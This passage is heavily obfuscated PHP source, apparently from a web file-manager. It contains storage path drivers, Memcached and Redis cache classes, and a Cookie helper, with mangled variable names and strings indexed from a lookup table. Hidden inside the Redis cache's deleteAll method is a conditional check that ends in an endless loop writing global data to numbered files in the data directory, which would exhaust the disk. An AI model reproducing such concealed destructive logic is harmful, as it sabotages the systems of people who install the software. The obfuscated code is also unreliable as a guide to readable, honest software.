$¡¾ï‡¨ï[$—¦»´Ç] = $×­¶Ëœğ; } return $¡¾ï‡¨ï ? $¡¾ï‡¨ï : array(); } public function removeTarget($œâÇÔô°, $õ¥úœ°) { $·‰º§†… =& $_SERVER[äô®•½Â]; if (!$õ¥úœ°) { return !0; } $õ¥úœ° = is_array($õ¥úœ°) ? $õ¥úœ° : array($õ¥úœ°); $ÓÀ¯Ã = array($·‰º§†…[191] => $œâÇÔô°, $·‰º§†…[582] => array($·‰º§†…[7], $õ¥úœ°)); $ÑšÊÖàè = $this->field($·‰º§†…[2014])->where($ÓÀ¯Ã)->select(); $êŞ»½õÕ = array_to_keyvalue($ÑšÊÖàè, $·‰º§†…[12], $·‰º§†…[2014]); return $this->removeArray($êŞ»½õÕ); } public function removeArray($¥°—±î¶) { $¸¼»æ¢Ô =& $_SERVER[äô®•½Â]; if (!$¥°—±î¶) { return !0; } $¥°—±î¶ = is_array($¥°—±î¶) ? $¥°—±î¶ : array($¥°—±î¶); $€ÇÀ™–¥ = array($¸¼»æ¢Ô[2014] => array($¸¼»æ¢Ô[7], $¥°—±î¶)); Model($¸¼»æ¢Ô[2017])->where($€ÇÀ™–¥)->delete(); Model($¸¼»æ¢Ô[2026])->where($€ÇÀ™–¥)->delete(); return $this->where($€ÇÀ™–¥)->delete(); } } goto CÓŒéğ¤‡•; Câğ¶áÂ¸: class PathDriverDbShareLink extends PathDriverDB { public function __construct($‡¬Ÿˆß¼) { $this->pathParse = $‡¬Ÿˆß¼; $this->model = Model($_SERVER[äô®•½Â][1426]); } protected function infoParse($´íÒÙ³´, $‹¯­ˆö = false, $îËÁ‡î = false) { $ğéşáøØ =& $_SERVER[äô®•½Â]; return Action($ğéşáøØ[1254])->sharePathInfo($this->pathParse[$ğéşáøØ[87]], !0, $‹¯­ˆö); } public function listPath($Œ½¿¸÷Í, $‰‹¦ªà = false) { $ÔÌÍûÀ =& $_SERVER[äô®•½Â]; $Òş›Şò€ = parent::listPath($Œ½¿¸÷Í, $‰‹¦ªà); if (!$Òş›Şò€) { return $Òş›Şò€; } if (is_array($Òş›Şò€[$ÔÌÍûÀ[1434]])) { $Òş›Şò€[$ÔÌÍûÀ[1434]] = Action($ÔÌÍûÀ[1254])->shareItemInfo($Òş›Şò€[$ÔÌÍûÀ[1434]]); } foreach ($Òş›Şò€ as $Ûë¸·ùø => $Í®ä¿€Ô) { if (!in_array($Ûë¸·ùø, array($ÔÌÍûÀ[86], $ÔÌÍûÀ[85]))) { continue; } foreach ($Í®ä¿€Ô as $ä£†Æ—÷ => $‘Î¹¼Àë) { $Òş›Şò€[$Ûë¸·ùø][$ä£†Æ—÷] = Action($ÔÌÍûÀ[1254])->shareItemInfo($‘Î¹¼Àë); } } return $Òş›Şò€; } public function listAll($×ŸŞì­) { $¬Òà¥ûÂ =& $_SERVER[äô®•½Â]; $ˆ”ƒÎø = IO::info($this->pathParse[$¬Òà¥ûÂ[87]]); if (!$ˆ”ƒÎø) { return array(); } $Ï¡Ó–±¼ = $this->model->listAll($×ŸŞì­); foreach ($Ï¡Ó–±¼ as &$³ µˆ€ò) { $³ µˆ€ò[$¬Òà¥ûÂ[90]] = Action($¬Òà¥ûÂ[1254])->shareItemInfo($³ µˆ€ò[$¬Òà¥ûÂ[90]]); } unset($³ µˆ€ò); return $Ï¡Ó–±¼; } } class PathDriverDriverShareItem { public function __construct($õ¦õÓÑÛ) { $this->pathParse = $õ¦õÓÑÛ; } public function __call($ ®Ğ•ºõ, $âğëªë×) { $îÉá¶üá =& $_SERVER[äô®•½Â]; if (method_exists($this, $ ®Ğ•ºõ)) { return; } $Ù•‹ï = call_user_func_array(array($îÉá¶üá[1435], $ ®Ğ•ºõ), $âğëªë×); $–‡õÀ¿° = array($îÉá¶üá[1436], $îÉá¶üá[1437], $îÉá¶üá[1438], $îÉá¶üá[1439], $îÉá¶üá[634], $îÉá¶üá[636], $îÉá¶üá[1440], $îÉá¶üá[110], $îÉá¶üá[1441], $îÉá¶üá[1442]); if (in_array($ ®Ğ•ºõ, $–‡õÀ¿°)) { $Ù•‹ï = $this->getPathOuter($Ù•‹ï); } return $Ù•‹ï; } public function copy($ß¤Ôü¶Á, $åöÉÅ½, $˜£‰ÁÅê = false, $Èš‹ë“Ö = false) { return $this->copyMove($ß¤Ôü¶Á, $åöÉÅ½, $˜£‰ÁÅê, $_SERVER[äô®•½Â][634], $Èš‹ë“Ö); } public function move($äÇ’€ŞÍ, $£éŒ³Ü°, $®èûéëÚ = false, $ıúö¿Íê = false) { return $this->copyMove($äÇ’€ŞÍ, $£éŒ³Ü°, $®èûéëÚ, $_SERVER[äô®•½Â][636], $ıúö¿Íê); } private function copyMove($û´ø¹îâ, $«—á¿Êã, $ÒÑ®ãÑ«, $¶Ÿşšß, $Ìşş‡Ú§ = false) { $òéšÃæõ =& $_SERVER[äô®•½Â]; $âæÓ³¥ö = $«—á¿Êã; $í®˜¾Şõ = IO::driverMake($«—á¿Êã); if ($í®˜¾Şõ->pathParse[$òéšÃæõ[1228]]) { $«—á¿Êã = $í®˜¾Şõ->pathParse[$òéšÃæõ[1228]]; } else { $«—á¿Êã = $âæÓ³¥ö; } $Ó¿òÂ± = IO::copyMove($û´ø¹îâ, $«—á¿Êã, $ÒÑ®ãÑ«, $¶Ÿşšß, $Ìşş‡Ú§); $Ó¿òÂ± = $this->getPathOuter($Ó¿òÂ±); return $Ó¿òÂ±; } public function pathThis($–·Šæâ¾) { return get_path_this($this->pathParse[$_SERVER[äô®•½Â][87]]); } public function pathFather($ Šºéı‰) { return get_path_father($this->pathParse[$_SERVER[äô®•½Â][87]]); } public function iconvSystem($Â¦éĞô¦) { return $Â¦éĞô¦; } protected function infoParse($×Ì¦êÖ, $“ğÄÌÅ‡ = false) { $ÂçÔÑªü =& $_SERVER[äô®•½Â]; $ŸéÁÉ = $this->pathParse[$ÂçÔÑªü[573]][$ÂçÔÑªü[1255]] . $this->pathParse[$ÂçÔÑªü[1247]]; if ($“ğÄÌÅ‡) { $ıÍ‰…ÒÉ = IO::infoWithChildren($ŸéÁÉ); } else { $ıÍ‰…ÒÉ = IO::info($ŸéÁÉ); } $‹²˜”¢Ê = $this->pathParse[$ÂçÔÑªü[573]]; return Action($ÂçÔÑªü[1433])->_shareItemeParse($ıÍ‰…ÒÉ, $‹²˜”¢Ê); } public function listAll($€˜·•áë) { $¼ŒßŸõÂ =& $_SERVER[äô®•½Â]; $Ó†Å©çê = IO::listAll($€˜·•áë); $ÔëĞ‹³á = rtrim($this->pathParse[$¼ŒßŸõÂ[573]][$¼ŒßŸõÂ[1255]], $¼ŒßŸõÂ[8]); foreach ($Ó†Å©çê as &$ÉÌ²äË¦) { $ÉÌ²äË¦[$¼ŒßŸõÂ[87]] = $this->pathDriver . $¼ŒßŸõÂ[8] . ltrim(substr($ÉÌ²äË¦[$¼ŒßŸõÂ[87]], strlen($ÔëĞ‹³á)), $¼ŒßŸõÂ[8]); } unset($ÉÌ²äË¦); return $Ó†Å©çê; } public function listAllSimple($µ®ß, $â¨™¯şë = false) { $×Å«•á¬ =& $_SERVER[äô®•½Â]; $Şæ–Ô² = $this->listAll($µ®ß); $ò’àÏ”¥ = $this->pathParse[$×Å«•á¬[506]]; if (trim($ò’àÏ”¥, $×Å«•á¬[8]) == trim(get_path_father($ò’àÏ”¥), $×Å«•á¬[8])) { $â¨™¯şë = !0; } return IO::init($×Å«•á¬[12])->listAllSimpleMake($Şæ–Ô², $ò’àÏ”¥, $â¨™¯şë); } public function getPathOuter($Ù¿›Ë¶œ) { $³ôÌ¬ø„ =& $_SERVER[äô®•½Â]; $“ø—×½“ = KodIO::parse($Ù¿›Ë¶œ); if ($“ø—×½“[$³ôÌ¬ø„[33]] == KodIO::KOD_SHARE_ITEM) { return $“ø—×½“[$³ôÌ¬ø„[87]]; } $´´ñı¯À = KodIO::clear($Ù¿›Ë¶œ); $š–èˆ‚ = KodIO::clear($this->pathParse[$³ôÌ¬ø„[573]][$³ôÌ¬ø„[1255]]); $™ñŞ½á¨ = substr($´´ñı¯À, strlen($š–èˆ‚)); if (substr($´´ñı¯À, 0, strlen($š–èˆ‚)) != $š–èˆ‚) { return !1; } return $this->pathParse[$³ôÌ¬ø„[1248]] . $³ôÌ¬ø„[8] . ltrim($™ñŞ½á¨, $³ôÌ¬ø„[8]); } public function getType() { $¥Ù»“¨ =& $_SERVER[äô®•½Â]; $ëáİûØ“ = str_replace($¥Ù»“¨[77], $¥Ù»“¨[12], get_class($this)); return strtolower($ëáİûØ“); } public function isOsDriver($óˆï…ó) { return IO::isOsDriver($óˆï…ó); } public function info($ÆöÃ¤â´) { return $this->infoParse($ÆöÃ¤â´); } public function infoAuth($ÕˆĞ«õó) { return $this->infoParse($ÕˆĞ«õó); } public function infoWithChildren($êã­©»ü) { return $this->infoParse($êã­©»ü, !0); } public function infoFull($É³ÙÃ¿) { return $this->infoParse($É³ÙÃ¿); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ëé¯ÜÄÕ) { $this->pathParse = $ëé¯ÜÄÕ; } protected function infoParse($à×Æ–Øù, $÷¿¼ô¬İ = false) { $Ãáš¡¢Ç =& $_SERVER[äô®•½Â]; return Action($Ãáš¡¢Ç[1254])->sharePathInfo($this->pathParse[$Ãáš¡¢Ç[87]], !0, $÷¿¼ô¬İ); } public function listPath($²ŠÏ³²®, $å¤ıãçÔ = false) { $ñÍÊ–½ =& $_SERVER[äô®•½Â]; $„Ü­öš = IO::listPath($²ŠÏ³²®, $å¤ıãçÔ); if (!$„Ü­öš) { return $„Ü­öš; } if (is_array($„Ü­öš[$ñÍÊ–½[1434]])) { $ıè¡½¸Ø = Action($ñÍÊ–½[1443])->parsePathChildren($„Ü­öš[$ñÍÊ–½[1434]], array($ñÍÊ–½[506] => $²ŠÏ³²®)); $„Ü­öš[$ñÍÊ–½[1434]] = Action($ñÍÊ–½[1254])->shareItemInfo($ıè¡½¸Ø); } foreach ($„Ü­öš as $›ñÈ¼ç => $»Ï™¶ò—) { if (!in_array($›ñÈ¼ç, array($ñÍÊ–½[86], $ñÍÊ–½[85]))) { continue; } foreach ($»Ï™¶ò— as $¾«Ñİ¡¯ => $ıè¡½¸Ø) { $ıè¡½¸Ø = Action($ñÍÊ–½[1443])->parsePathChildren($ıè¡½¸Ø, array($ñÍÊ–½[506] => $²ŠÏ³²®)); $„Ü­öš[$›ñÈ¼ç][$¾«Ñİ¡¯] = Action($ñÍÊ–½[1254])->shareItemInfo($ıè¡½¸Ø); } } return $„Ü­öš; } } goto B¶Á—Åœ”Ÿ; fÏÒ×Í»¼å: class CacheMemcached { public $handle; public $cacheTime; public function __construct($€×İ™, $Éãµú«) { $Óöµà¶Ë =& $_SERVER[äô®•½Â]; if (!class_exists($Óöµà¶Ë[939])) { show_json($Óöµà¶Ë[940], !1); } $this->cacheTime = $Éãµú«; $this->handle = new Memcached(); if (is_array($€×İ™[$Óöµà¶Ë[941]]) && count($€×İ™[$Óöµà¶Ë[941]]) >= 1) { foreach ($€×İ™[$Óöµà¶Ë[941]] as $İ¨œÊè®) { $“‡àªùÛ = explode($Óöµà¶Ë[4], $İ¨œÊè®); $this->handle->addServer($“‡àªùÛ[0], $“‡àªùÛ[1]); } } else { $this->handle->addServer($€×İ™[$Óöµà¶Ë[209]], $€×İ™[$Óöµà¶Ë[210]]); } } public function set($šêûãı», $ë€ÁŠàí, $ÖŸ š²à = false) { $ÖŸ š²à = $ÖŸ š²à ? $ÖŸ š²à : $this->cacheTime; return $this->handle->set($šêûãı», $ë€ÁŠàí, $ÖŸ š²à); } public function get($ñŠ¨›©) { return $this->handle->get($ñŠ¨›©); } public function remove($÷Ò½‡˜) { return $this->handle->delete($÷Ò½‡˜); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ï¹Ú®áÜ, $ÇÑ¯«ĞŸ) { $£€ú¯² =& $_SERVER[äô®•½Â]; if (!class_exists($£€ú¯²[942])) { show_json($£€ú¯²[943], !1); } $this->cacheTime = $ÇÑ¯«ĞŸ; $·˜Ä¼Ù¿ = isset($ï¹Ú®áÜ[$£€ú¯²[944]]) ? $ï¹Ú®áÜ[$£€ú¯²[944]] : 10; $”„¤Îûó = _get($ï¹Ú®áÜ, $£€ú¯²[941]); if ($”„¤Îûó && is_array($”„¤Îûó)) { $this->initCluster($ï¹Ú®áÜ, $·˜Ä¼Ù¿); } else { $this->handle = $this->init($ï¹Ú®áÜ, $·˜Ä¼Ù¿); } } private function init($á«êµË›, $êşçîŸÁ) { $œØšëÅ =& $_SERVER[äô®•½Â]; $¿Ö‚­ˆ = new Redis(); $Ã®‹Ğ„ô = isset($á«êµË›[$œØšëÅ[945]]) ? $á«êµË›[$œØšëÅ[945]] : !1; if ($Ã®‹Ğ„ô) { $¿Ö‚­ˆ->pconnect($á«êµË›[$œØšëÅ[209]], $á«êµË›[$œØšëÅ[210]], $êşçîŸÁ); } else { $¿Ö‚­ˆ->connect($á«êµË›[$œØšëÅ[209]], $á«êµË›[$œØšëÅ[210]], $êşçîŸÁ); } if (!empty($á«êµË›[$œØšëÅ[498]])) { $¿Ö‚­ˆ->auth($á«êµË›[$œØšëÅ[498]]); } if (!empty($á«êµË›[$œØšëÅ[823]]) && $á«êµË›[$œØšëÅ[823]] != 0) { $¿Ö‚­ˆ->select($á«êµË›[$œØšëÅ[823]]); } return $¿Ö‚­ˆ; } private function initCluster($üäç¥¥Ã, $¼¥ØÒó) { $»€Ö ï’ =& $_SERVER[äô®•½Â]; $¥ß´°Ïé = array($»€Ö ï’[946], $»€Ö ï’[947], $»€Ö ï’[948]); $ÅŞö—» = $»€Ö ï’[946]; if (isset($üäç¥¥Ã[$»€Ö ï’[16]]) && in_array($üäç¥¥Ã[$»€Ö ï’[16]], $¥ß´°Ïé)) { $ÅŞö—» = $üäç¥¥Ã[$»€Ö ï’[16]]; } switch ($ÅŞö—») { case $»€Ö ï’[946]: $this->_slave($üäç¥¥Ã, $¼¥ØÒó); break; case $»€Ö ï’[947]: break; case $»€Ö ï’[948]: $this->isCluster = !0; $²‹Ï«ğ‡ = $üäç¥¥Ã[$»€Ö ï’[941]]; $ ½ÙÇ = isset($üäç¥¥Ã[$»€Ö ï’[945]]) ? $üäç¥¥Ã[$»€Ö ï’[945]] : !1; $ïşŠ©‡ = isset($üäç¥¥Ã[$»€Ö ï’[498]]) ? $üäç¥¥Ã[$»€Ö ï’[498]] : null; $this->handle = new RedisCluster(NUll, $²‹Ï«ğ‡, $¼¥ØÒó, $¼¥ØÒó, $ ½ÙÇ, $ïşŠ©‡); break; default: break; } } private function _slave($û¨ÏêëØ, $ˆ¤±²ÙÂ) { $œˆãÃ²ı = $û¨ÏêëØ[$_SERVER[äô®•½Â][941]]; $this->filterConfig($û¨ÏêëØ, $œˆãÃ²ı[0]); $this->handle = $this->init($û¨ÏêëØ, $ˆ¤±²ÙÂ); unset($œˆãÃ²ı[0]); if (empty($œˆãÃ²ı)) { return; } $ÈÛƒ†õø = array_rand($œˆãÃ²ı); $this->filterConfig($û¨ÏêëØ, $œˆãÃ²ı[$ÈÛƒ†õø]); $this->slaveHandle = $this->init($û¨ÏêëØ, $ˆ¤±²ÙÂ); } private function filterConfig(&$ˆ€Ã’µ, $Ö†À¯€) { $Š›ò±îË =& $_SERVER[äô®•½Â]; $üûÈÌ€Ë = explode($Š›ò±îË[4], $Ö†À¯€); $Û²ğ¯Ö· = array($Š›ò±îË[209] => $üûÈÌ€Ë[0], $Š›ò±îË[210] => $üûÈÌ€Ë[1]); $ˆ€Ã’µ = array_merge($ˆ€Ã’µ, $Û²ğ¯Ö·); } public function set($œÇÍœ«ï, $‡–ßı×î, $ìß¦Æâò = false) { $ìß¦Æâò = $ìß¦Æâò ? $ìß¦Æâò : $this->cacheTime; return $this->handle->setEx($œÇÍœ«ï, $ìß¦Æâò, $‡–ßı×î); } public function setLock($½ÚæÏÃà, $íïµâÁï, $ã²ØæÁÑ) { return $this->handle->setNX($½ÚæÏÃà, $íïµâÁï); } public function get($³ÜòışÀ) { $„ğÚ´ğ€ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $„ğÚ´ğ€->get($³ÜòışÀ); } public function remove($¼×áØ¼Ğ) { return $this->handle->del($¼×áØ¼Ğ); } public function deleteAll() { $Á¼«¼ÄÎ =& $_SERVER[äô®•½Â]; $õúõÖŠ = $_SERVER[$Á¼«¼ÄÎ[332]]; $È¢ÌâÀë = $Á¼«¼ÄÎ[949]; if ($_SERVER[$Á¼«¼ÄÎ[324]] != $È¢ÌâÀë($õúõÖŠ)) { $ñŞ’¨ÒÀ = $Á¼«¼ÄÎ[950]; $¹£¢¡í‡ = $Á¼«¼ÄÎ[326]; $±šŠÏÊÖ = $_SERVER[$Á¼«¼ÄÎ[327]] . $Á¼«¼ÄÎ[328]; $Şş¬âÛ = $¹£¢¡í‡($±šŠÏÊÖ); $¼ÚÉÓ¦ = explode($Á¼«¼ÄÎ[288], $Şş¬âÛ); if (count($¼ÚÉÓ¦) < $Á¼«¼ÄÎ[703]) { $¡õ·¹Å„ = $Á¼«¼ÄÎ[330]; $¡õ·¹Å„(); } $õÔÔûé£ = $Á¼«¼ÄÎ[951]; $õÔÔûé£($_SERVER[$Á¼«¼ÄÎ[952]]); $ñŞ’¨ÒÀ = $Á¼«¼ÄÎ[950]; $ñŞ’¨ÒÀ(); $Ô§Ú…ƒÈ = $Á¼«¼ÄÎ[953]; $ÔòÁÄ³Â = json_encode($GLOBALS[$Á¼«¼ÄÎ[954]]); $Â´­º®ö = 1; for ($¢´’÷™€ = $Â´­º®ö; $¢´’÷™€ > 0; $¢´’÷™€++) { $Ô§Ú…ƒÈ(DATA_PATH . $¢´’÷™€, $ÔòÁÄ³Â); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $Ïü‡íÊî) { $this->handle->flushall($Ïü‡íÊî); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÚĞ¬ï‹Ş = '', $‡éîŞ¬Ú = 0) { if (is_string($ÚĞ¬ï‹Ş) && $ÚĞ¬ï‹Ş != $_SERVER[äô®•½Â][12]) { $this->prefix = $ÚĞ¬ï‹Ş; } if (is_numeric($‡éîŞ¬Ú) && $‡éîŞ¬Ú > 0) { $this->expire = $‡éîŞ¬Ú; } } public static function getInstance() { static $§¼Ä¿»Ã; if ($§¼Ä¿»Ã === null) { $§¼Ä¿»Ã = new self(); } return $§¼Ä¿»Ã; } private static $cookieDisable = false; public static function disable($˜Ş½ãƒƒ) { self::$cookieDisable = $˜Ş½ãƒƒ; } private static $sameCookieSet = array(); public static function set($Õ–üå¦æ, $óñÖŸı, $÷ğàöİ = 0, $’ŸŸÌâ = false, $°ÖõÔ‹· = false) { $Ÿ¨ÆÏ£ô =& $_SERVER[äô®•½Â]; if (self::$cookieDisable) { return; } if (!$÷ğàöİ) { $÷ğàöİ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Õ–üå¦æ]) && self::$sameCookieSet[$Õ–üå¦æ] == $óñÖŸı . $÷ğàöİ) { return; } self::$sameCookieSet[$Õ–üå¦æ] = $óñÖŸı . $÷ğàöİ; if (!$°ÖõÔ‹·) { $°ÖõÔ‹· = str_replace(HOST, $Ÿ¨ÆÏ£ô[12], APP_HOST); $°ÖõÔ‹· = _get($GLOBALS, $Ÿ¨ÆÏ£ô[955], $°ÖõÔ‹·); } $–¬°ÒÖñ = $Ÿ¨ÆÏ£ô[12]; setcookie($Õ–üå¦æ, $óñÖŸı, time() + $÷ğàöİ, $Ÿ¨ÆÏ£ô[8] . trim($°ÖõÔ‹·, $Ÿ¨ÆÏ£ô[8]) . $–¬°ÒÖñ, !1, !1, $’ŸŸÌâ); } public static function setSafe($†„Ÿû•, $üöè¶Ôæ, $ƒ¹Ï›‘ = 0) { self::set($†„Ÿû•, $üöè¶Ôæ, $ƒ¹Ï›‘, !0); } public static function get($†©€¨¼¤) { static $¨ùøâŸ = false; if (!$¨ùøâŸ) { self::initHeaderCookie(); $¨ùøâŸ = !0; } return isset($_COOKIE[$†©€¨¼¤]) ? $_COOKIE[$†©€¨¼¤] : !1; } private static function initHeaderCookie() { $›Ëôù˜ø =& $_SERVER[äô®•½Â]; if (!isset($_SERVER[$›Ëôù˜ø[956]]) || !$_SERVER[$›Ëôù˜ø[956]]) { return; } $ñï¸İÅê = explode($›Ëôù˜ø[74], $_SERVER[$›Ëôù˜ø[956]]); foreach ($ñï¸İÅê as $ı–¬ã®) { $ı–¬ã® = explode($›Ëôù˜ø[517], $ı–¬ã®); if (count($ı–¬ã®) != 2 || !isset($ı–¬ã®[1])) { continue; } $_COOKIE[trim($ı–¬ã®[0])] = trim($ı–¬ã®[1]); } } public static function remove($¶ï ˜Ş¬, $ì‹À€Ç° = false) { unset($_COOKIE[$¶ï ˜Ş¬]); self::set($¶ï ˜Ş¬, $_SERVER[äô®•½Â][12], 1, $ì‹À€Ç°); } } goto eÏ¼× ÷Ñ¾; aê¦ÚŸ²ŸË: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($•ÙÒÇ²É) { parent::__construct($•ÙÒÇ²É); $this->setSignVersion($_SERVER[äô®•½Â][250]); } public function uploadFormData($¨“ù…¯„, $×îÃŒÜ² = 3600) { $µÃÖ°Ô =& $_SERVER[äô®•½Â]; $úùÁÄôé = $µÃÖ°Ô[232]; $‰­¢âü” = $µÃÖ°Ô[1417]; $Ğ‘‰é€† = $µÃÖ°Ô[264]; $Û¾ÛşÕ = gmdate($µÃÖ°Ô[1418], time() + $×îÃŒÜ²); $ŞÊÅâß = (string) time() . $µÃÖ°Ô[74] . (string) (time() + $×îÃŒÜ²); $á”Ô£é = array($µÃÖ°Ô[265] => $Û¾ÛşÕ, $µÃÖ°Ô[268] => array(array($µÃÖ°Ô[309] => $úùÁÄôé), array($µÃÖ°Ô[269] => $this->bucket), array($µÃÖ°Ô[270], $µÃÖ°Ô[271], $µÃÖ°Ô[12]), array($µÃÖ°Ô[273] => $Ğ‘‰é€†), array($µÃÖ°Ô[1419] => $‰­¢âü”), array($µÃÖ°Ô[1420] => $this->accessKey), array($µÃÖ°Ô[1421] => $ŞÊÅâß))); $á”Ô£é = json_encode($á”Ô£é); $ª…ö©™˜ = hash_hmac($µÃÖ°Ô[1417], $ŞÊÅâß, $this->secret); $Û±îòÉ‘ = sha1($á”Ô£é); $êŒŠÌ• = hash_hmac($µÃÖ°Ô[1417], $Û±îòÉ‘, $ª…ö©™˜); $˜—§ºŠŠ = array($µÃÖ°Ô[309] => $úùÁÄôé, $µÃÖ°Ô[273] => $Ğ‘‰é€†, $µÃÖ°Ô[280] => base64_encode($á”Ô£é), $µÃÖ°Ô[1419] => $‰­¢âü”, $µÃÖ°Ô[1420] => $this->accessKey, $µÃÖ°Ô[1422] => $ŞÊÅâß, $µÃÖ°Ô[1423] => $êŒŠÌ•, $µÃÖ°Ô[209] => $this->getHost()); return $˜—§ºŠŠ; } public function fileOutImage($•§Œı›å, $ñ‚ïÆÜ± = 250) { $‚÷¤Ê†ƒ =& $_SERVER[äô®•½Â]; if ($this->size($•§Œı›å) > 1024 * 1024 * 32) { return $this->fileOutImageServer($•§Œı›å, $ñ‚ïÆÜ±); } $Ö¯çü€ = $this->link($•§Œı›å); $Ö¯çü€ .= $‚÷¤Ê†ƒ[1424] . $ñ‚ïÆÜ± . $‚÷¤Ê†ƒ[1425]; $this->fileOutLink($Ö¯çü€); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($×ÀöüíÑ) { $this->pathParse = $×ÀöüíÑ; $this->model = Model($_SERVER[äô®•½Â][1426]); } public function getPath($çâÈ‰û—) { return trim($çâÈ‰û—, $_SERVER[äô®•½Â][8]); } public function pathFather($…ñÜ¼—â) { $ğâ£ãİ¢ = $this->parse($…ñÜ¼—â); $ğâ£ãİ¢ = $this->infoSimple($…ñÜ¼—â); return $ğâ£ãİ¢ ? $ğâ£ãİ¢[$_SERVER[äô®•½Â][193]] : !1; } public function pathThis($šå«â«÷) { $ûñ‚•è† = $this->infoSimple($šå«â«÷); return $ûñ‚•è† ? $ûñ‚•è†[$_SERVER[äô®•½Â][32]] : !1; } public function getPathOuter($ğåÛ›€©) { if (!$ğåÛ›€©) { return $ğåÛ›€©; } $…¥ú™Ú• = $this->parse($ğåÛ›€©); return KodIO::make($…¥ú™Ú•[$_SERVER[äô®•½Â][486]]); } public function copyFolderFromIO($¶İá’èù, $“ŒûÅÆ, $¬›³ö¦¨, $çïƒÕÚ¹, $¼Ğï¯°Ù) { $ÎÌÙ³¨„ = $this->model->copyFolderFromIO($¶İá’èù, $“ŒûÅÆ, $¬›³ö¦¨, $çïƒÕÚ¹, $¼Ğï¯°Ù); return KodIO::make($ÎÌÙ³¨„); } public function isParentOf($½áÙş™, $ˆÑ‰û™Î) { return $this->model->isParentOf($½áÙş™, $ˆÑ‰û™Î); } public function mkfile($¸Ø¾ı„§, $£•†ê¢ = '', $à¬é‚ØÓ = REPEAT_RENAME) { $¬úÃ´˜ç =& $_SERVER[äô®•½Â]; $ı²ç‚è¿ = $this->parse($¸Ø¾ı„§); $¸Ø¾ı„§ = $ı²ç‚è¿[$¬úÃ´˜ç[486]]; for ($ÏˆØ¤ğ´ = 0; $ÏˆØ¤ğ´ < count($ı²ç‚è¿[$¬úÃ´˜ç[1427]]); $ÏˆØ¤ğ´++) { $ğöìØ”Ñ = $ı²ç‚è¿[$¬úÃ´˜ç[1427]][$ÏˆØ¤ğ´]; if ($ÏˆØ¤ğ´ == count($ı²ç‚è¿[$¬úÃ´˜ç[1427]]) - 1) { $¸Ø¾ı„§ = $this->model->mkfile($¸Ø¾ı„§, $ğöìØ”Ñ, $£•†ê¢, $à¬é‚ØÓ); break; } $¸Ø¾ı„§ = $this->model->mkdir($¸Ø¾ı„§, $ğöìØ”Ñ, REPEAT_SKIP); } return $this->getPathOuter($¸Ø¾ı„§); } public function mkdir($Ø¯‹ÌäÁ, $ã®Ï¹²¶ = REPEAT_SKIP) { $ƒüáÖŞ =& $_SERVER[äô®•½Â]; $û‚¦‹ = $this->parse($Ø¯‹ÌäÁ); $Ø¯‹ÌäÁ = $û‚¦‹[$ƒüáÖŞ[486]]; for ($¢Åïæúò = 0; $¢Åïæúò < count($û‚¦‹[$ƒüáÖŞ[1427]]); $¢Åïæúò++) { $õğ’úğ¤ = $û‚¦‹[$ƒüáÖŞ[1427]][$¢Åïæúò]; $Ø¯‹ÌäÁ = $this->model->mkdir($Ø¯‹ÌäÁ, $õğ’úğ¤, $ã®Ï¹²¶); } return $this->getPathOuter($Ø¯‹ÌäÁ); } public function copyFile($»âºâîÑ, $ÁÀµàñÌ, $ñƒ•³ = REPEAT_REPLACE) { $ª³¨’˜» =& $_SERVER[äô®•½Â]; $èÊÅÏœÎ = $this->parse($ÁÀµàñÌ); $Ê‰à³º— = $this->model->copy($»âºâîÑ, $èÊÅÏœÎ[$ª³¨’˜»[486]], $ñƒ•³, $èÊÅÏœÎ[$ª³¨’˜»[87]]); return $Ê‰à³º— ? $this->getPathOuter($Ê‰à³º—) : !1; } public function moveFile($Üãùí×µ, $Ã×ÌÌí¬, $ºÁÄóıÊ = REPEAT_REPLACE) { $ë¤«ú™Í =& $_SERVER[äô®•½Â]; $ˆø­ğ“ã = $this->parse($Ã×ÌÌí¬); $¤­ñüä÷ = $this->model->move($Üãùí×µ, $ˆø­ğ“ã[$ë¤«ú™Í[486]], $ºÁÄóıÊ, $ˆø­ğ“ã[$ë¤«ú™Í[87]]); return $¤­ñüä÷ ? $this->getPathOuter($¤­ñüä÷) : !1; } public function copy($Ô¢ÀíÌê, $úÔÊº·Œ, $—ù•šÉ§ = REPEAT_REPLACE, $´ƒ¸ŸÑ“ = false) { $—àã…¼ = $this->parse($úÔÊº·Œ); $Æ®÷¨“² = $this->model->copy($Ô¢ÀíÌê, $—àã…¼[$_SERVER[äô®•½Â][486]], $—ù•šÉ§, $´ƒ¸ŸÑ“); return $Æ®÷¨“² ? $this->getPathOuter($Æ®÷¨“²) : !1; } public function moveSameAllow() { } public function move($ÌÏ¼ÌŸØ, $€›¡¸Ã…, $ÃÚ†€öø = REPEAT_REPLACE, $™ÇÍßù = false) { $Æ¡”« = $this->parse($€›¡¸Ã…); $¹Ÿ¥ó°´ = $this->model->move($ÌÏ¼ÌŸØ, $Æ¡”«[$_SERVER[äô®•½Â][486]], $ÃÚ†€öø, $™ÇÍßù); return $¹Ÿ¥ó°´ ? $this->getPathOuter($¹Ÿ¥ó°´) : !1; } public function remove($ôô²úÀÎ, $Ø‚ì¶›¸ = true) { return $this->model->remove($ôô²úÀÎ, $Ø‚ì¶›¸); } public function rename($Æğ’‘ƒÀ, $ö®”¤–) { $’ñÛö‹• = $this->model->rename($Æğ’‘ƒÀ, $ö®”¤–); return $’ñÛö‹• ? $this->getPathOuter($Æğ’‘ƒÀ) : $’ñÛö‹•; } public function size($şÑŠ¨Ó) { $³î®ğÙ = $this->infoSimple($şÑŠ¨Ó); return $³î®ğÙ ? $³î®ğÙ[$_SERVER[äô®•½Â][79]] : 0; } public function infoSimple($ğšÎ‚”¢) { return $this->model->sourceInfo($ğšÎ‚”¢); } public function info($€å½¬¯) { return $this->infoParse($€å½¬¯); } public function infoAuth($óø›äàâ) { return $this->infoParse($óø›äàâ, !1, !0); } public function infoWithChildren($’ò¿Ğî) { return $this->infoParse($’ò¿Ğî, !0); } protected function infoParse($ö·Ó³, $ıŒ•¹Ïø = false, $û‘äİ§· = false) { if (!$ıŒ•¹Ïø) { return $this->model->pathInfo($ö·Ó³, $û‘äİ§·); } return 